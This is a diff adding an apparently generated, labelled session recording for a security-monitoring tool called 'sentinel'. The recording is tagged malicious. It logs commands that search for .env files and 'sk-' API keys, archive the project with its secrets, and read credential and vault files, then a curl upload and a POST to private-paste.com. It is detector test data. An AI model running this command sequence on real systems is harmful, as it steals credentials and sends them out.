@@ -1,0 +1,168 @@
+{
+  "format": "sentinel-session-v1",
+  "metadata": {
+    "id": "gen-na-mrn9sast-e6ee30",
+    "recordedAt": "2026-07-16T08:46:32.141Z",
+    "durationMs": 2683,
+    "platform": "win32",
+    "hostname": "generator",
+    "username": "eval",
+    "workingDirectory": "C:/project-185",
+    "sentinelVersion": "1.0.0",
+    "tags": [
+      "malicious",
+      "recon",
+      "prep",
+      "HIGH",
+      "generated"
+    ]
+  },
+  "events": [
+    {
+      "type": "process",
+      "data": {
+        "pid": 8000,
+        "name": "find.exe",
+        "commandLine": "find . -type f -name \"*.env\"",
+        "timestamp": "2026-07-16T08:46:32.262Z",
+        "riskIndicators": [
+          "recon"
+        ]
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 8001,
+        "name": "grep.exe",
+        "commandLine": "grep -r \"sk-\" --include=\"*.env\" --include=\"*.json\" .",
+        "timestamp": "2026-07-16T08:46:32.335Z",
+        "riskIndicators": [
+          "recon"
+        ]
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 8002,
+        "name": "git",
+        "commandLine": "git remote -v",
+        "timestamp": "2026-07-16T08:46:32.353Z",
+        "riskIndicators": [
+          "recon"
+        ]
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 8003,
+        "name": "tar.exe",
+        "commandLine": "tar -czf /tmp/project.tar.gz src/ config/ .env",
+        "timestamp": "2026-07-16T08:46:33.057Z",
+        "riskIndicators": [
+          "archive"
+        ]
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/.env",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.221Z",
+        "bytesRead": 1865
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/.env.prod",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.221Z",
+        "bytesRead": 2218
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/credentials.json",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.221Z",
+        "bytesRead": 2399
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/config/secrets.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.221Z",
+        "bytesRead": 1222
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/db/config/database.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.221Z",
+        "bytesRead": 2129
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/deploy/ansible/vault.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.221Z",
+        "bytesRead": 2129
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 5001,
+        "name": "curl.exe",
+        "commandLine": "curl -s -o /dev/null -w \"%{http_code}\" https://private-paste.com/api/upload",
+        "timestamp": "2026-07-16T08:46:33.479Z",
+        "riskIndicators": [
+          "network_tool"
+        ]
+      }
+    },
+    {
+      "type": "flow",
+      "data": {
+        "id": "na-mrn9sast-yhxmpf",
+        "sessionId": "",
+        "timestamp": "2026-07-16T08:46:33.632Z",
+        "protocol": "TLS",
+        "sourceAddr": "192.168.1.100",
+        "sourcePort": 49001,
+        "destAddr": "185.199.0.1",
+        "destPort": 443,
+        "hostname": "private-paste.com",
+        "sni": "private-paste.com",
+        "bytesSent": 5296,
+        "bytesReceived": 256,
+        "durationMs": 1009,
+        "method": "POST",
+        "path": "/api/upload"
+      }
+    }
+  ]
+}
